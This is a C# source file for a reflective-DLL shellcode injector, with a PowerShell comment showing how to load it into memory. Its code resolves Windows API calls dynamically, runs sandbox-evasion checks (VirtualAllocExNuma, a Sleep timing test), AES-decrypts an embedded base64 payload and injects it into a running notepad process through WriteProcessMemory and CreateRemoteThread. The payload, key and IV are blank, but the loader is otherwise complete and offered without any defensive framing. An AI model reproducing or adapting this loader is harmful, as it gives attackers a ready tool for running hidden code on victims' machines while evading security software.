/*
$dll = "C:\...\DLLReflectiveDLLInjection.dll"
$bytes = [System.IO.File]::ReadAllBytes($dll)
[System.Reflection.Assembly]::Load($bytes)
[DLLReflectiveDLLInjection.Main]::run()
*/

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace DLLReflectiveDLLInjection
{
    public class Main
    {
        private static byte[] PerformCryptography(byte[] buf, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(buf, 0, buf.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }

        public static byte[] Decrypt(byte[] buf, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(buf, decryptor);
                }
            }
        }

        public static void run()
        {
            var pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "VirtualAllocExNuma");
            var dVirtualAllocExNuma = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.VirtualAllocExNuma)) as DynamicInvoke.VirtualAllocExNuma;

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "GetCurrentProcess");
            var dGetCurrentProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.GetCurrentProcess)) as DynamicInvoke.GetCurrentProcess;
            IntPtr mem = dVirtualAllocExNuma(dGetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            DateTime t1 = DateTime.Now;

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "Sleep");
            var dSleep = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.Sleep)) as DynamicInvoke.Sleep;
            dSleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            Process[] targetProcess = Process.GetProcessesByName("notepad");

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "OpenProcess");
            var dOpenProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.OpenProcess)) as DynamicInvoke.OpenProcess;
            IntPtr hProcess = dOpenProcess(0x001F0FFF, false, targetProcess[0].Id);

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
            var dVirtualAllocEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.VirtualAllocEx)) as DynamicInvoke.VirtualAllocEx;
            IntPtr addr = dVirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            string finalPayload = "";
            byte[] key = new byte[] {  };
            byte[] iv = new byte[] {  };
            byte[] decrypted_data = Decrypt(Convert.FromBase64String(finalPayload), key, iv);

            IntPtr outSize;

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
            var dWriteProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.WriteProcessMemory)) as DynamicInvoke.WriteProcessMemory;
            dWriteProcessMemory(hProcess, addr, decrypted_data, decrypted_data.Length, out outSize);

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "CreateRemoteThread");
            var dCreateRemoteThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.CreateRemoteThread)) as DynamicInvoke.CreateRemoteThread;
            IntPtr hThread = dCreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
